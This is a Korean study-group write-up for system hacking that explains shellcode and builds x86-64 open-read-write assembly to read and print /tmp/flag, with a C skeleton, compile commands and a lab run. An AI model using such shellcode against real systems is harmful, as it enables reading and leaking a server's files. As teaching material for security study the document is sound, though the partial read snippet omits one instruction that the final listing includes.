2025 하계스터디 시스템해킹 1주차: 셸코드
==============================

1.셸코드(Shellcode) 개념
-----------------

**셸코드** 는 익스플로잇을 위해 특별히 제작된 어셈블리 코드이다.

일반적으로 셸을 획득하는 것이 목적이지만 특정 기능을 수행하는 데 사용될 수도 있다.

시스템 해킹에서 매우 중요하며 해커가 직접 작성한 셸코드를 실행할 수 있다면 원하는 어셈블리 코드를 실행시킬 수 있다.

어셈블리는 기계어와 거의 일대일 대응이므로 CPU에 원하는 명령을 직접 내릴 수 있다.

셸코드는 공격 대상 아키텍처와 운영체제에 따라 다르게 작성되며, 
공유되는 셸코드는 범용적으로 작성되어 시스템 환경을 완전히 반영하지 못할 수 있으므로 최적의 셸코드는 직접 작성하는 것이 권장된다.



2.orw 셸코드 작성
----------------------

`/tmp/flag` 파일 읽고 출력하는 셸코드는 다음과 같다.

```c
char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```


**시스템 콜(Syscall) 테이블** 은 

  * `open`: `rax` 0x02, `arg0(rdi)` const char \*filename, `arg1(rsi)` int flags, `arg2(rdx)` umode\_t mode
  * `read`: `rax` 0x00, `arg0(rdi)` unsigned int fd, `arg1(rsi)` char \*buf, `arg2(rdx)` size\_t count
  * `write`: `rax` 0x01, `arg0(rdi)` unsigned int fd, `arg1(rsi)` const char \*buf, `arg2(rdx)` size\_t count

----------------------------------


먼저  **`open("/tmp/flag", O_RDONLY, NULL)`** 부분 구현을 보면

* **`/tmp/flag` 문자열 메모리에 위치시키기:**
      * `/tmp/flag`의 리틀 엔디언 형태인 `0x67616c662f706d742f`를 `push` 명령을 통해 스택에 넣음
  (8바이트 단위로 push 가능하므로 `0x67`을 먼저 push 후 전체 주소를 push)
      * `rdt`가 이를 가리키도록 `rsp`를 `rdi`로 옮김
  * **`O_RDONLY` 설정:**
      * `O_RDONLY`는 0이므로 `rsi`를 0으로 설정 (`#define O_RDONLY 0` 참조)
  * **`mode` 설정:**
      * 파일을 읽을 때 `mode`는 의미가 없으므로 `rdx`를 0으로 설정
  * **`rax` 설정 및 `syscall` 호출:**
      * `open` 시스템 콜을 호출하기 위해 `rax`를 2로 설정

        
**`open` 구현 어셈블리 코드:**

```assembly
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp       ; rdi = "/tmp/flag"
xor rsi, rsi       ; rsi = 0 ; O_RDONLY
xor rdx, rdx       ; rdx = 0
mov rax, 2         ; rax = 2 ; syscall_open
syscall            ; open("/tmp/flag", 0, 0)
```

-----------------------------

**`read(fd, buf, 0x30)`** 구현 부분을 보면

  * **`fd` 설정:**
      * `open` 시스템 콜의 반환 값(파일 디스크립터)은 `rax`에 저장되므로 `rax`에 저장된 `fd` 값을 `rdi`에 대입
  * **`buf` 설정:**
      * `rs`는 파일에서 읽어온 데이터를 저장할 주소를 가리킴.
        스택 포인터 `rsp`에서 `0x30`만큼 감소시킨 주소를 `rsi`에 대입하여 버퍼로 사용
  * **`len` 설정:**
      * 읽어올 데이터의 길이인 `0x30`을 `rdx`에 설정
  * **`rax` 설정 및 `syscall` 호출:**
      * `read` 시스템 콜을 호출하기 위해 `rax`를 0으로 설정


**`read` 구현 어셈블리 코드:**

```assembly
mov rdi, rax       ; rdi = fd
sub rsi, 0x30      ; rsi = rsp-0x30 ; buf
mov rdx, 0x30      ; rdx = 0x30 ; len
mov rax, 0         ; rax = 0 ; syscall_read
syscall            ; read(fd, buf, 0x30)
```

--------------------------------------

**`write(1, buf, 0x30)`** 부분 구현을 보면 

  * **`fd` 설정:** 출력을 `stdout` (표준 출력)으로 보낼 것이므로 `rdi`를 1로 설정 (`fd = stdout`)
  * **`buf`와 `len` 설정:** `read` 시스템 콜에서 사용했던 `rsi` (버퍼 주소)와 `rdx` (길이) 값을 그대로 사용
  * **`rax` 설정 및 `syscall` 호출:** `write` 시스템 콜을 호출하기 위해 `rax`를 1로 설정


**`write` 구현 어셈블리 코드:**

```assembly
mov rdi, 1         ; rdi = 1 ; fd = stdout
mov rax, 0x1       ; rax = 1 ; syscall_write
syscall            ; write(fd, buf, 0x30)
```

--------------------------------


**`open`, `read`, `write` 시스템 콜 구현 코드를 모두 합친 최종 어셈블리 코드** 는 

```assembly
; Name: orw.S
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp       ; rdi = "/tmp/flag"
xor rsi, rsi       ; rsi = 0 ; RD_ONLY
xor rdx, rdx       ; rdx = 0
mov rax, 2         ; rax = 2 ; syscall_open
syscall            ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax       ; rdi = fd
mov rsi, rsp
sub rsi, 0x30      ; rsi = rsp-0x30 ; buf
mov rdx, 0x30      ; rdx = 0x30 ; len
mov rax, 0         ; rax = 0 ; syscall_read
syscall            ; read(fd, buf, 0x30)

mov rdi, 1         ; rdi = 1 ; fd = stdout
mov rax, 0x1       ; rax = 1 ; syscall_write
syscall            ; write(fd, buf, 0x30)
```



3.orw 셸코드 컴파일 및 실행
-------------------------

* **실행 가능한 파일 형식:** 운영체제는 실행 가능한 파일의 형식을 정의하며
  윈도우의 PE, 리눅스의 ELF가 대표적이다. ELF는 헤더와 기타 데이터(기계어 코드 포함)로 구성된다.
  * `orw.S`는 순수 아스키 어셈블리 코드이므로 이 자체로는 리눅스에서 실행될 수 없으며,
    CPU가 이해할 수 있는 ELF 형식으로 변환해야 한다.
  * **컴파일 방법:** 어셈블리 코드를 ELF 형태로 변환하기 위해 gcc 컴파일러를 사용한다.
    셸코드를 실행할 수 있는 "스켈레톤 코드"라고 불리는 C 언어 파일에 셸코드를 삽입하여 컴파일한다.

---------------------------------------

### **스켈레톤 코드(`sh-skeleton.c`)**

`__asm__` 블록을 사용하여 인라인 어셈블리 형태로 셸코드를 포함하고 
main 함수에서 `run_sh()` 함수를 호출하여 셸코드를 실행한다. 
스켈레톤 코드에는 `exit(0)` 시스템 콜 (`xor rdi, rdi; mov rax, 0x3c; syscall`)이 포함되어 있다.

```c
// File name: sh-skeleton.c
// Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "Input your shellcode here.\n" // 여기에 실제 셸코드가 들어감
    "Each line of your shellcode should be\n"
    "seperated by '\\n\\n'\n"
    "xor rdi, rdi\n"
    "mov rax, 0x3c\n" // rax = sys_exit
    "syscall\n"      // # exit(0)
);
void run_sh();
int main() { run_sh(); }
```

-------------------------------------------------------------

![image](https://github.com/user-attachments/assets/07c5b2dd-6447-40ac-9e13-f8093e467029)

실제 `orw.S`의 내용을 스켈레톤 코드의 `__asm__` 블록에 삽입해 완성했다. 
마지막에 `exit(0)` 시스템 콜이 포함되어 셸코드 실행 후 정상 종료된다.

![image](https://github.com/user-attachments/assets/7431f2be-1c96-45ae-a2a1-a6a27c6fb47c)

 * 셸코드가 `/tmp/flag` 파일을 성공적으로 읽고 출력하는지 확인하기 위해 먼저 `/tmp/flag` 파일을 생성한다. 
 * gcc -o orw orw.c -masm=intel 명령어로 orw.c를 컴파일한 후 ./orw 로 실행한다.
 * 실행 결과로 `/tmp/flag` 파일에 저장된 문자열(`flag{this_is_open_read_write_shellcode!}`)이 출력되는 것을 확인할 수 있다.
 * 만약 공격 대상 시스템에서 이 셸코드를 실행할 수 있다면 서버의 주요 정보를 유출할 수 있을 것이다.




